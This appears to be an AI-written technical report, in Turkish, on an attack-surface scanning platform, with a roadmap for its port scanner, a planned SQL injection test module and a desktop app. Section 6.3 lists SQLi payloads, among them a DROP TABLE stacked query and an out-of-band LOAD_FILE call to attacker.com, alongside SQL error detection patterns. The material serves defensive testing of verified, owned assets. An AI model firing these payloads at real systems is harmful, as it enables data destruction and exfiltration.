# ASM — Teknik Durum Raporu ve Yol Haritası

> Tarih: 2026-05-22
> Hazırlayan: Claude (Opus 4.7) — ASM kod tabanı incelemesi sonucu
> Kapsam: Mevcut sistemin ayrıntılı teknik durumu, tespit edilen hata/eksikler, port tarama doğruluğu, SQLi modülü ve masaüstü uygulaması için yol haritası

---

## İçindekiler

1. [Yönetici Özeti](#1-yönetici-özeti)
2. [Mevcut Sistemin Mimari Durumu](#2-mevcut-sistemin-mimari-durumu)
3. [Tarama Motoru — Doğruluk ve Güvenilirlik Analizi](#3-tarama-motoru--doğruluk-ve-güvenilirlik-analizi)
4. [Tespit Edilen Hatalar ve Eksikler (Öncelik Sırasıyla)](#4-tespit-edilen-hatalar-ve-eksikler-öncelik-sırasıyla)
5. [Port Taraması — Detaylı Doğruluk Analizi](#5-port-taraması--detaylı-doğruluk-analizi)
6. [Aşama 1: SQL Injection Modülü Tasarımı](#6-aşama-1-sql-injection-modülü-tasarımı)
7. [Aşama 2: Masaüstü Uygulaması Tasarımı](#7-aşama-2-masaüstü-uygulaması-tasarımı)
8. [Önerilen Yapılacaklar Listesi (Sıralı)](#8-önerilen-yapılacaklar-listesi-sıralı)

---

## 1. Yönetici Özeti

ASM platformu **mimari olarak olgun** bir noktada: 12 check tipiyle paralel tarama, 27 finding tipi, BullMQ kuyruk altyapısı, AI analiz (Claude/Ollama), pasif intelligence (OTX), JWT auth, Pwned Passwords kontrolü, RDAP/GeoIP/PhishTank/AbuseIPDB/URLhaus/HIBP/LeakCheck/AlienVault OTX entegrasyonları çalışıyor. CLAUDE.md sürekli güncel tutulmuş, test coverage de orta seviyede (worker %76, API %62 dolaylarında).

Bununla birlikte **3 net cephe** var:

| Cephe | Durum | Aciliyet |
|-------|-------|----------|
| **A. Mevcut sistem hataları + tarama doğruluğu** | Port taraması yüzeysel (8 port, banner yok, version yok). HTTP/TLS check'lerde User-Agent yok. Bazı edge case'ler kontrol edilmiyor. | **Yüksek** — kapatmadan SQLi'ye geçmek anlamsız |
| **B. SQL Injection modülü** | Henüz yok. Yeni `sqli.check.ts`, finding tipleri, prompt, doğrulama listesi gerekecek. Mock vulnerable forum altyapısı planlı. | Orta — A bittikten sonra |
| **C. Masaüstü uygulaması** | Mevcut React/Vite kod tabanını **Tauri** ile çok düşük maliyetle paketleyebilirsiniz. Electron alternatif ama 100-150 MB bundle. | Düşük — B'den sonra |

Önerim: **A → B → C** sırasıyla, **A'yı 2-3 oturumda bitirip**, B'yi 3-4 oturumda kapatıp, C'yi son sprint olarak yapmak. Aşağıda her birinin detaylı planı var.

---

## 2. Mevcut Sistemin Mimari Durumu

### 2.1 Bileşen Envanteri

```
e:\Projects\asm\
├── apps/
│   ├── api/        NestJS 11 + Prisma 7 + PostgreSQL 16        (port 3000)
│   ├── worker/     Node.js + BullMQ consumer + 12 check        (Redis 6380)
│   └── web/        React 18 + Vite 5 + Tailwind 3 + RQ 5       (port 5173)
├── packages/
│   └── shared/     Ortak TS tipleri ve sabitler
├── docker-compose.yml  postgres:16 + redis:7
└── CLAUDE.md           Birincil dokümantasyon (937 satır)
```

### 2.2 Modüller (apps/api/src)

| Modül | Sorumluluk | Notlar |
|-------|-----------|--------|
| `auth/` | JWT register/login/me + bcrypt 10 round + Pwned Passwords K-Anonymity | Token refresh **yok** |
| `assets/` | CRUD + DNS/HTTP ownership verification + intelligence aggregation | URL hostname doğrulama SSRF'e karşı korumalı |
| `modules/scans/` | Run-now + history + repeat schedule | JobId stratejisi netleştirilmiş |
| `modules/findings/` | Filtreli listeleme + ack | Manuel resolve endpoint **yok** |
| `modules/queue/` | BullMQ modülü ve sabitler | DLQ var |
| `modules/intelligence/` | Passive OTX lookup + history | AI summary template-based (Türkçe) |
| `modules/assistant/` | OTX chat + asset context | Anthropic SDK ile direkt |
| `prisma/` | PrismaService singleton | `PrismaPg` adapter (driver-adapter mode) |
| `common/` | HttpExceptionFilter, decorators | Tutarlı hata formatı |

### 2.3 Worker Check'leri (apps/worker/src/checks)

| Check | Süre | API Key? | Asset Tipleri | Doğruluk Risk |
|-------|------|----------|---------------|---------------|
| `ports.check` | 1.5s/port | ✗ | Domain + IP | **Yüksek** (sadece 8 port, banner yok) |
| `tls.check` | 5s | ✗ | Domain | Orta (protokol/cipher version yok) |
| `http.check` | 5s | ✗ | Domain + IP | Orta (UA yok, retry yok) |
| `security-headers` | 8s | ✗ | Domain | Orta (HEAD-only, fallback yok) |
| `dns-records` | DNS bağımlı | ✗ | Domain | Düşük |
| `rdap.check` | 8s | ✗ | Domain | Düşük |
| `geoip.check` | 6s | ✗ | Hepsi | Düşük (ip-api ücretsiz, rate limit 45/dk) |
| `robots.check` | 5s | ✗ | Domain | Düşük |
| `phishtank.check` | 15s | Opsiyonel | Domain | Düşük (cache + skip mantığı sağlam) |
| `reputation.check` | 8s | AbuseIPDB için | Hepsi | Düşük |
| `breach.check` | 10s | HIBP/LeakCheck için | Domain | Düşük |
| `otx.check` | 4 endpoint paralel | OTX API key | Domain + IPv4 | Düşük |

### 2.4 Finding Tipleri (27 adet — `packages/shared/src/finding-types.ts`)

`port × 2, tls × 3, http × 2, security_header × 1, dns × 8, whois × 2, geoip × 2, robots × 2, phishtank × 1, reputation × 1, breach × 1, otx × 2`

> Not: `FINDING_TYPES` Object.values'tan türetiliyor, yeni tip eklediğinizde yalnızca bu objeye eklemek yeterli.

### 2.5 Veritabanı (5 migration)

```
20260224214912_init                          — Base schema
20260225105250_add_finding_key_severity_lastseen
20260301113509_add_scan_check_result
20260301132218_add_finding_resolved_at
20260428105505_add_asset_scan_interval
```

**Eksik migration:** `PassiveLookupRun` modeli `schema.prisma`'da var (CLAUDE.md'de listeli) ama migration dosyası listede yok. Bu olası bir tutarsızlık — `pnpm prisma migrate status` çıktısıyla doğrulanması gerekir.

### 2.6 Frontend Sayfaları

- **Asset & Monitör:** Login → Assets → AssetDetail
- **Intelligence:** PassiveLookup, ThreatIntelligence, ReputationCenter
- **Knowledge:** About, TechnicalInfo, PortGuide, DnsSecurity, TlsGuide, HttpHeaders, RiskScoring

---

## 3. Tarama Motoru — Doğruluk ve Güvenilirlik Analizi

### 3.1 Güçlü Yönler

1. **`safeCheck` wrapper** her check'i izole ediyor — bir check çökerse diğerleri devam eder, scan FAILED olmaz.
2. **`Promise.allSettled`** snapshot kaydında tek hatayı tüm scan'i etkilemekten alıkoyuyor.
3. **Per-processor try/catch** finding işlemede her tipi izole ediyor.
4. **Değişiklik tespiti** — önceki snapshot'a göre PORT/TLS/HTTP/DNS/GEOIP/ROBOTS değişiklikleri doğru tespit ediliyor.
5. **AI fallback** — Claude/Ollama başarısız olursa statik skor korunuyor.
6. **DLQ** — 3 attempt başarısız olursa `scan-dlq` kuyruğuna gönderiliyor.

### 3.2 Doğruluk Açısından Zayıf Yönler

| # | Sorun | Etki | Çözüm Önerisi |
|---|-------|------|---------------|
| D1 | Port listesi sadece 8 port (`80, 443, 22, 3389, 8080, 8443, 3000, 5555`) | Veritabanı portları (3306, 5432, 27017, 6379), mail (25, 587, 110), FTP (21), Telnet (23), DNS (53), Elasticsearch (9200), Kubernetes API (6443) gibi kritik portlar **hiç taranmıyor** | Bkz. §5 — port listesi genişletme planı |
| D2 | Banner grabbing yok | Açık portun arkasındaki servisi (Apache 2.4.49, OpenSSH 7.2 vb.) tespit edemiyoruz → CVE eşleştirme imkânsız | TCP connect sonrası 256 byte oku, regex ile parse et |
| D3 | TLS check protokol/cipher version'ı raporlamıyor | TLS 1.0/1.1 hala destekleniyor mu, zayıf cipher var mı bilinmiyor | `socket.getProtocol()` + `socket.getCipher()` ekle |
| D4 | HTTP check User-Agent göndermiyor | Cloudflare/WAF arkasındaki siteler Node default UA'yı bloklayabilir → false negative | `User-Agent: ASM-Scanner/1.0 (+https://your-domain)` ekle |
| D5 | Security-headers sadece HEAD request | Bazı sunucular HEAD'i 405 ile reddeder veya farklı header set'i döner | HEAD başarısız olursa GET fallback ekle |
| D6 | HTTP check'te 4xx/5xx özel finding üretmiyor | 500/503 alan asset'ler `HTTP_HEALTH` finding'i alıyor ama bu statusCode varken `attempts` boş → kafa karıştırıcı | 5xx için ayrı severity, 4xx için info |
| D7 | TLS check'te chain validation kapalı (`rejectUnauthorized: false`) | Self-signed veya expired root CA tespit edilemiyor | Chain validation hatasını ayrı bir alan olarak rapor et — yine `rejectUnauthorized: false` kalsın ama `socket.authorizationError` kaydet |
| D8 | Port `socket.setTimeout(1500)` agresif | Yavaş ağlarda (Asya, Afrika) false negative üretebilir | Timeout'u env'den okunabilir yap, default 3000 ms |
| D9 | DNS resolver hardcoded Cloudflare | `apps/worker/src/checks/geoip.check.ts:50` ve `apps/api/src/assets/assets.service.ts:323` — bazı ağlarda Cloudflare 1.1.1.1 bloklu | `DNS_SERVERS` env'i hem worker'da hem API'de kullan |
| D10 | `PassiveLookupRun` migration kayıp olabilir | Schema-DB drift potansiyeli | `pnpm prisma migrate status` ile doğrula, gerekirse migration üret |
| D11 | Worker'da OTX scan default kapalı (`ENABLE_OTX_IN_VERIFIED_SCANS`) | Asset detayında "OTX henüz çalışmamış" görünebilir, kullanıcı kafası karışır | UI'da bunu açıkça göster: "OTX şu an aktif değil — passive lookup'a bakın" |

### 3.3 Güvenlik Açısından Riskler

1. **Webhook URL doğrulaması yok** (`run-scan.ts:45`): `N8N_WEBHOOK_URL` env'den okunuyor ama URL formatı doğrulanmıyor. Bir attacker config dosyasını ele geçirip kendi sunucusuna webhook yönlendirebilir. Düşük öncelikli ama `new URL()` ile en azından parse edilmeli.
2. **Asset verifyHttp SSRF koruması iyi** (`assets.service.ts:259`): hostname asset domain'iyle eşleşmeli, sadece http/https kabul edilmeli — bu kısım sağlam.
3. **Asset value lowercase + trailing slash strip var** ama IDN/punycode normalize edilmiyor — `bücher.de` ve `xn--bcher-kva.de` ayrı asset olabilir.
4. **AI prompt injection riski**: `aiWhyJson` Claude/Ollama'dan geliyor, response validation var (`getItemValidationError`) ama içerik kullanıcıya direkt render ediliyor — şu an XSS değil çünkü React JSX otomatik escape ediyor, sadece bilinmesi gereken bir nokta.

---

## 4. Tespit Edilen Hatalar ve Eksikler (Öncelik Sırasıyla)

### 🔴 Kritik (Şimdi düzeltilmeli)

| ID | Sorun | Dosya | Çözüm |
|----|-------|-------|-------|
| H1 | Port listesi yetersiz — DB/mail/FTP/Telnet portları taranmıyor | `apps/worker/src/config/constants.ts:1` | DEFAULT_PORTS'u 30+ porta çıkar (§5'te detay) |
| H2 | Banner grabbing yok → servis versiyonu/CVE eşleşmesi imkânsız | `apps/worker/src/checks/ports.check.ts` | Bağlantı kurduktan sonra 256 byte oku, regex parse et |
| H3 | TLS protokol/cipher version raporlanmıyor | `apps/worker/src/checks/tls.check.ts:44` | `protocol`, `cipher` alanları ekle |
| H4 | HTTP check User-Agent göndermiyor → WAF bloklayabilir | `apps/worker/src/checks/http.check.ts:22` | `headers: { 'User-Agent': '...' }` ekle |
| H5 | DB `PassiveLookupRun` migration kayıp olabilir | `apps/api/prisma/migrations/` | `pnpm prisma migrate status` doğrula |

### 🟠 Yüksek (SQLi modülünden önce halledilmeli)

| ID | Sorun | Dosya | Çözüm |
|----|-------|-------|-------|
| H6 | Security-headers HEAD-only, fallback yok | `apps/worker/src/checks/security-headers.check.ts:89` | HEAD 405/501 dönerse GET dene |
| H7 | HTTP check'te 5xx için ayrı finding yok | `apps/worker/src/findings/http.findings.ts` | `HTTP_SERVER_ERROR` finding tipi (HIGH) ekle |
| H8 | TLS chain validation hatası kaybediliyor | `apps/worker/src/checks/tls.check.ts:20` | `socket.authorizationError` alanını response'a ekle |
| H9 | Port timeout sabit 1500ms — yavaş ağlarda false negative | `apps/worker/src/checks/ports.check.ts:18` | Env'den okunabilir yap (`PORT_SCAN_TIMEOUT_MS`, default 3000) |
| H10 | Frontend token refresh yok — 7 günde bir logout | `apps/web/src/api/client.ts` | Refresh token mekanizması ekle veya en azından expiry yaklaşırken uyarı göster |

### 🟡 Orta (SQLi paralelinde yapılabilir)

| ID | Sorun | Çözüm |
|----|-------|-------|
| H11 | Manuel finding resolve endpoint yok | `PATCH /findings/:id/resolve` ekle |
| H12 | DNS_SERVERS env worker'da kullanılmıyor (sadece API'de) | Worker'da da uygula |
| H13 | OTX verified scan'lerde default kapalı, UI'da belirtilmiyor | Frontend'de "OTX şu an passive lookup'tan çekiliyor" notu |
| H14 | Webhook URL format doğrulaması yok | `new URL()` ile parse, fail-soft |
| H15 | IDN/punycode normalization eksik | `value` set ederken `URL` constructor ile normalize |

### 🟢 Düşük (Sonra)

- AI analiz retry + rate limit yönetimi
- ScanCheckResult partitioning
- Redis connection pooling
- E-posta bildirimleri (SMTP entegrasyonu)

---

## 5. Port Taraması — Detaylı Doğruluk Analizi

### 5.1 Mevcut Durum

`apps/worker/src/config/constants.ts:1`:

```ts
export const DEFAULT_PORTS = [80, 443, 22, 3389, 8080, 8443, 3000, 5555] as const;
export const RISKY_PORTS = [22, 3389, 8080, 8443, 3000, 5555] as const;
export const CRITICAL_PORTS = [22, 3389] as const;
```

8 port taranıyor. Bunlar **HTTP/S + uzaktan yönetim** odaklı. Aşağıdaki kritik servisler **gözden kaçıyor**:

| Port | Servis | Risk | Şu an? |
|------|--------|------|--------|
| 21 | FTP | Plaintext kimlik | ❌ |
| 23 | Telnet | Plaintext shell | ❌ |
| 25 | SMTP | Open relay, brute force | ❌ |
| 53 | DNS | Open resolver, amplification | ❌ |
| 110/143 | POP3/IMAP | Plaintext mail | ❌ |
| 445 | SMB | EternalBlue ailesi | ❌ |
| 587 | SMTP submission | Open relay | ❌ |
| 993/995 | IMAPS/POP3S | İyi ama izlemek lazım | ❌ |
| 1433 | MSSQL | DB internet'e açık | ❌ |
| 3306 | MySQL | DB internet'e açık | ❌ |
| 5432 | PostgreSQL | DB internet'e açık | ❌ |
| 5900 | VNC | Genelde şifresiz | ❌ |
| 6379 | Redis | Genelde auth'suz | ❌ |
| 9200 | Elasticsearch | Veri çalma | ❌ |
| 11211 | Memcached | Amplification | ❌ |
| 27017 | MongoDB | Genelde auth'suz | ❌ |

### 5.2 Önerilen Port Listesi (30 port — pratik denge)

```ts
export const DEFAULT_PORTS = [
  // Web
  80, 443, 8080, 8443,
  // Remote management
  22, 23, 3389, 5900,
  // Mail
  25, 110, 143, 465, 587, 993, 995,
  // DNS
  53,
  // File / SMB
  21, 445,
  // Databases
  1433, 3306, 5432, 6379, 27017,
  // Indexing / Discovery
  9200, 11211,
  // Dev / Internal
  3000, 5555, 8000, 8888, 9000,
] as const;
```

### 5.3 Banner Grabbing Tasarımı

`checkSinglePort` içinde, `connect` sonrası:

```ts
socket.once('connect', async () => {
  socket.write('\r\n'); // hafif tetikleyici
  const chunks: Buffer[] = [];
  socket.on('data', (chunk) => {
    chunks.push(chunk);
    if (Buffer.concat(chunks).length >= 256) socket.end();
  });
  setTimeout(() => socket.end(), 500); // banner için 500ms
  socket.once('end', () => {
    const banner = Buffer.concat(chunks).toString('utf8', 0, 256).trim();
    finish({ port, open: true, latencyMs, banner, service: parseBanner(banner), error: null });
  });
});
```

`parseBanner` örneği:

```ts
const SIGNATURES = [
  { regex: /^SSH-([\d.]+)-OpenSSH_([\d.p]+)/, service: 'ssh', extract: ['protocol', 'version'] },
  { regex: /^220.*FTP/, service: 'ftp' },
  { regex: /^220.*SMTP/, service: 'smtp' },
  { regex: /^HTTP\/[\d.]+ \d+ .*Server: ([\w/.]+)/, service: 'http' },
  { regex: /^\+OK.*POP3/, service: 'pop3' },
  // ... 10-15 imza
];
```

### 5.4 Doğruluk İçin Ek İyileştirmeler

1. **Adaptif timeout**: İlk port (genelde 80 veya 443) için RTT ölç, kalanlar için `RTT × 3` kullan (min 1000, max 5000).
2. **Concurrent limit**: `Promise.all` 30 portu **aynı anda** kuruyor — bazı SYN-flood detection sistemleri bunu DDoS gibi görür. `p-limit` ile 8 paralel + queue.
3. **IP doğrulama**: Asset DOMAIN ise IP çöz, **tüm A kayıtlarındaki IP'leri** tara (load-balanced site'ler farklı sunuculara çözülebilir).
4. **IPv6 desteği**: Şu an `net.Socket` IPv4 ön sıralı (`dns.setDefaultResultOrder('ipv4first')` worker.ts:9). IPv6 only domain'ler taranamıyor → opsiyonel ikinci pas.

---

## 6. Aşama 1: SQL Injection Modülü Tasarımı

### 6.1 Kullanım Senaryosu (Kullanıcı Açıklamasından)

> "Kendi domainime bir forum kayıt yeri vs. açmayı düşünüyorum basic bir şekilde 10-15 adet SQL Injection testine sokacak uygulamamız ve sadece sonuçları açıkları döndürecek yapay zeka da yorumlayacak."

**Anlamı**: Kullanıcı kendi domain'inde **kasıtlı zafiyetli** bir form (örn. `forum/register.php`) ayağa kaldıracak. ASM bu URL'i `sqli.check` olarak tarayacak, 10-15 farklı SQLi payload'ı ile test edecek, sonuçları finding olarak kaydedecek ve AI ile yorumlayacak.

> ⚠️ **Etik/Yasal**: Sadece **kullanıcının kendi sahipliğini doğruladığı** asset'ler için aktif edilmeli. `assets.status === VERIFIED` zorunlu — ASM'deki ownership verification zaten bu kapıyı kapatıyor, sadece UI'da ekstra "aktif zafiyet testi onayı" gerekecek.

### 6.2 Mimari

```
apps/worker/src/checks/
  ├── sqli.check.ts                # 10-15 payload runner
  └── sqli/
      ├── payloads.ts              # Payload katalogu
      ├── detectors.ts             # Error-based, time-based, boolean-based detection
      └── http-client.ts           # Cookie + CSRF token + form parser
```

### 6.3 Payload Katalogu (Önerilen 12 Test)

| # | Tip | Payload | Detection | Severity |
|---|-----|---------|-----------|----------|
| 1 | Error-based — tek tırnak | `'` | Yanıt body'de SQL hata mesajı (MySQL/PG/MSSQL signature regex) | CRITICAL |
| 2 | Error-based — çift tırnak | `"` | Aynı | CRITICAL |
| 3 | Boolean-based TRUE | `' OR '1'='1' --` | Login bypass, content match | CRITICAL |
| 4 | Boolean-based FALSE | `' AND '1'='2' --` | Boş sonuç | HIGH |
| 5 | UNION-based | `' UNION SELECT NULL,NULL --` | "different number of columns" hatası | CRITICAL |
| 6 | Time-based MySQL | `' OR SLEEP(5)--` | Response time > 4500ms | CRITICAL |
| 7 | Time-based PostgreSQL | `'; SELECT pg_sleep(5)--` | Response time > 4500ms | CRITICAL |
| 8 | Time-based MSSQL | `'; WAITFOR DELAY '00:00:05'--` | Response time > 4500ms | CRITICAL |
| 9 | Stacked queries | `'; DROP TABLE x;--` | Hata mesajı veya 500 | HIGH |
| 10 | Comment injection | `admin'--` | Login bypass | CRITICAL |
| 11 | Hex/encoded | `0x27 OR 1=1--` | Hata veya bypass | HIGH |
| 12 | Out-of-band (DNS) | `'; LOAD_FILE('//attacker.com/x')--` | DNS callback (opsiyonel) | CRITICAL |

### 6.4 Tespit Mantığı

```ts
const SQL_ERROR_SIGNATURES = [
  /SQL syntax.*MySQL/i,
  /Warning.*\Wmysqli?_/i,
  /MySQLSyntaxErrorException/i,
  /valid PostgreSQL result/i,
  /Microsoft.*ODBC.*SQL Server/i,
  /Oracle.*ORA-\d+/i,
  /SQLite.*error/i,
  /supplied argument is not a valid/i,
];

function detectError(body: string): { detected: boolean; database?: string } { /* ... */ }
function detectTimeBased(baseline: number, withPayload: number): boolean {
  return withPayload - baseline > 4000; // 4s threshold (payload SLEEP 5)
}
function detectBoolean(trueBody: string, falseBody: string): boolean {
  return Math.abs(trueBody.length - falseBody.length) > 100;
}
```

### 6.5 Yeni Tipler

**`packages/shared/src/finding-types.ts`**'e ekle:
```ts
SQLI_ERROR_BASED:       'SQLI_ERROR_BASED',
SQLI_BOOLEAN_BASED:     'SQLI_BOOLEAN_BASED',
SQLI_TIME_BASED:        'SQLI_TIME_BASED',
SQLI_UNION_BASED:       'SQLI_UNION_BASED',
```

**`packages/shared/src/scan-check-types.ts`**'e ekle:
```ts
SQLI_TEST: 'SQLI_TEST',
```

### 6.6 Asset/Endpoint Modeli

SQLi sadece "bu URL'e POST yap" şeklinde değil, form-aware olmalı:

```ts
// Yeni model — yeni migration gerekecek
model SqliTarget {
  id          String   @id @default(cuid())
  assetId     String
  url         String   // https://example.com/forum/register
  method      String   // POST | GET
  params      Json     // { username: "test", password: "test", csrf: "<token>" }
  injectField String   // hangi parametre enjekte edilecek
  enabled     Boolean  @default(true)
  createdAt   DateTime @default(now())
}
```

UI'da kullanıcı: "Bu asset için aktif zafiyet testi ekle" → URL + form alanları + hangi alana enjekte edileceği.

### 6.7 AI Yorum Promptu (Mevcut `analyzeFindings`'a Eklenecek)

```
Sen savunma odaklı bir penetrasyon test analistisin.
SQL Injection bulgularını incele:
- Hangi payload başarılı oldu?
- Hangi DBMS engine? (signature'dan tespit edildi)
- Acil eylem: parametrize sorgu, WAF rule, env değişikliği?
- Risk: veri sızıntısı, RCE, auth bypass mümkün mü?

aiScore: 95+ (CRITICAL — production DB'ye dokunabilir)
```

### 6.8 Implementation Sırası

1. **packages/shared** — yeni finding/check type sabitleri (1 commit)
2. **apps/api/prisma** — `SqliTarget` modeli + migration (1 commit)
3. **apps/api** — `sqli-targets/` modülü: CRUD (1 commit)
4. **apps/worker** — `sqli.check.ts` + payload katalogu + detector (1 commit)
5. **apps/worker** — `sqli.findings.ts` + scan orchestration integration (1 commit)
6. **apps/web** — Asset detail'e "Aktif Test Hedefleri" sekmesi (1 commit)
7. **AI prompt** — `analyze.ts` SQLi finding'leri için ek prompt (1 commit)
8. **Test fixture** — `verify-demo/` altında mock vulnerable forum (opsiyonel)
9. **Docs** — CLAUDE.md güncelle

**Tahmini süre:** 3-4 oturum.

---

## 7. Aşama 2: Masaüstü Uygulaması Tasarımı

### 7.1 Seçenek Karşılaştırması

| Kriter | Electron | Tauri | .NET MAUI |
|--------|----------|-------|-----------|
| Mevcut React kodunu kullan | ✅ %100 | ✅ %100 | ❌ (re-write) |
| Bundle boyutu | 100-150 MB | **5-15 MB** | 30-60 MB |
| Performans | Orta | Yüksek (Rust) | Yüksek (.NET) |
| Windows/Mac/Linux | ✅ | ✅ | ✅ (Linux deneysel) |
| Native API erişimi | JS bridge | Rust commands | C# direkt |
| Öğrenme eğrisi (sizin için) | Düşük | Orta (Rust gerekiyor ama sadece config için) | Yüksek |
| Auto-update | electron-updater | Tauri updater | MAUI içinde |
| **Önerim** | İkinci tercih | ⭐ **Birinci** | Hayır |

### 7.2 Önerim: Tauri

**Neden:**
1. Vite + React zaten var, Tauri direkt `pnpm create tauri-app` ile mevcut frontend'i sarar.
2. 10 MB civarı bundle, Electron'un 1/10'u.
3. WebView2 (Win) / WKWebView (Mac) kullanır — kullanıcının cihazındaki sistem WebView'ını kullandığı için boyut küçük.
4. Rust tarafı sadece OS-level şeyler için: tray icon, native notification, otomatik başlatma.

### 7.3 Hedef Mimari

```
asm-desktop/
├── src-tauri/
│   ├── tauri.conf.json    # Bundle, icon, window config
│   ├── Cargo.toml
│   └── src/
│       └── main.rs        # System tray, notifications, auto-start
└── (frontend referansı apps/web'e)
```

İki çalıştırma modu:

**Mod A — Standalone (Embedded API)**
- API + Worker + PostgreSQL (SQLite'a port edilmiş) + Redis (yerine in-memory queue) tek binary
- Kullanıcı sadece `.msi` veya `.exe` çalıştırır
- Karmaşık ama "indirip kullan" deneyimi

**Mod B — Client-Only (Önerilen)**
- Tauri yalnızca frontend
- Kullanıcı backend URL'i girer (`http://localhost:3000` veya `https://asm.your-domain.com`)
- Backend ayrı çalışır (Docker veya VPS)
- Çok daha basit, ilk versiyonda bunu yapın

### 7.4 Eklenebilecek Native Özellikler

- **Sistem Tepsisi**: tarama tamamlanınca toast bildirimi (CRITICAL bulguda titreşim/ses)
- **Otomatik Başlatma**: Windows startup'a kayıt
- **Local Notification**: Native bildirim (Web push'tan farklı, OS-level)
- **Tarama Sonuçlarını CSV/PDF Export**: Tauri'nin dialog API'siyle dosya kaydet
- **Çoklu Tenant**: Birden fazla ASM instance'ına bağlanabilen profil seçici

### 7.5 Implementation Sırası

1. `pnpm create tauri-app` — repo root'una `desktop/` veya ayrı repo
2. `tauri.conf.json` — `frontendDist: '../apps/web/dist'`, icon, window config
3. CSP'yi Tauri'nin connect-src'ine API URL'i ekle
4. `pnpm tauri dev` — geliştirme test
5. Tray icon + notification Rust commands
6. `pnpm tauri build` — `.msi` (Windows) + `.dmg` (Mac) + `.AppImage` (Linux)
7. Auto-update — Tauri updater + GitHub Releases

**Tahmini süre:** 2-3 oturum (Mod B için).

---

## 8. Önerilen Yapılacaklar Listesi (Sıralı)

### Sprint 1: Mevcut Sistem Düzeltmeleri (Bu Hafta)

- [ ] **H1** Port listesini 30 porta çıkar (`constants.ts`)
- [ ] **H2** Banner grabbing ekle (`ports.check.ts` + `parseBanner`)
- [ ] **H3** TLS protokol/cipher version raporla
- [ ] **H4** HTTP check'e User-Agent ekle
- [ ] **H5** `pnpm prisma migrate status` ile DB drift kontrolü
- [ ] **H6** Security-headers HEAD → GET fallback
- [ ] **H7** HTTP 5xx için `HTTP_SERVER_ERROR` finding
- [ ] **H8** TLS chain validation hatasını rapor et
- [ ] **H9** Port scan timeout'u env'den oku
- [ ] **CLAUDE.md güncelle**

### Sprint 2: SQL Injection Modülü (Önümüzdeki 2 Hafta)

- [ ] Yeni finding/check tipleri (`packages/shared`)
- [ ] `SqliTarget` modeli + migration
- [ ] `sqli.check.ts` + 12 payload + 3 detector
- [ ] `sqli.findings.ts` processor
- [ ] API: `/sqli-targets` CRUD
- [ ] UI: Asset detail'e aktif test hedefleri sekmesi
- [ ] AI prompt'a SQLi yorumu
- [ ] Mock vulnerable forum (verify-demo altında)
- [ ] **CLAUDE.md güncelle**

### Sprint 3: Masaüstü Uygulaması (Sonraki 2 Hafta)

- [ ] Tauri kurulumu + frontendDist yapılandırma
- [ ] Pencere ikon ve splash screen
- [ ] Sistem tepsisi entegrasyonu
- [ ] Native notification (CRITICAL bulguda)
- [ ] CSV/PDF export
- [ ] Auto-update mekanizması
- [ ] Windows MSI installer
- [ ] **CLAUDE.md güncelle**

### Sprint 4: Geri Kalan İyileştirmeler

- [ ] H10 Frontend token refresh
- [ ] H11 Manuel finding resolve endpoint
- [ ] H12 Worker DNS_SERVERS env
- [ ] H13 OTX UI durumu netleştir
- [ ] H14 Webhook URL validation
- [ ] H15 IDN/punycode normalization
- [ ] Subdomain keşfi (roadmap'ten)
- [ ] CVE/NVD entegrasyonu (banner sonuçları ile)

---

## Notlar

- **Test stratejisi**: Şu an coverage worker %76 / API %62. Sprint 1 sonrası SQLi modülü için yeni testler de eklenmeli (`sqli.check.spec.ts`, `sqli.findings.spec.ts`).
- **Backward compatibility**: Port listesi genişletildiğinde, mevcut asset'lerin PORT_EXPOSED finding'leri otomatik güncellenir (`upsertFinding` `(assetId, key)` çiftine bağlı). Sorun olmaz.
- **Performans**: 30 port × 3000ms timeout = en kötü senaryoda 90 saniye/asset. p-limit ile 8 paralel kullanırsanız ~12 saniye.
- **Etik sınır**: SQLi modülü **mutlaka** asset ownership doğrulamasının arkasında olmalı + UI'da ek bir "aktif zafiyet testi onayı" toggle'ı + audit log (`SqliTestRun`).

---

> Sonraki adım: Bu raporu birlikte gözden geçirip Sprint 1'in **H1 (port listesi genişletme)** ile başlamak öneririm. "Başla" derseniz `constants.ts` + `ports.check.ts` + banner grabbing'i tek oturumda kapatırız.
